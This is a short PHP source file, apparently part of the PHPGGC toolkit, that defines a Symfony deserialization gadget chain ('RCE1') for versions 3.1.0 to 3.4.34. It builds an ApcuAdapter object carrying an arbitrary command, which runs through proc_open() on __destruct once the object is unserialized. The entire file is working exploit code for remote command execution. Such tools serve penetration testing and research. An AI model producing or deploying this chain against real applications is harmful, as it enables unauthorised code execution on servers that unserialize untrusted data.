<?php

namespace GadgetChain\Symfony;

class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = 'v3.1.0 <= v3.4.34';
    public static $vector = '__destruct';
    public static $author = 'cfreal';
    public static $information = 'Executes given command through proc_open()';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Cache\Adapter\ApcuAdapter(
        	$command
        );
    }
}
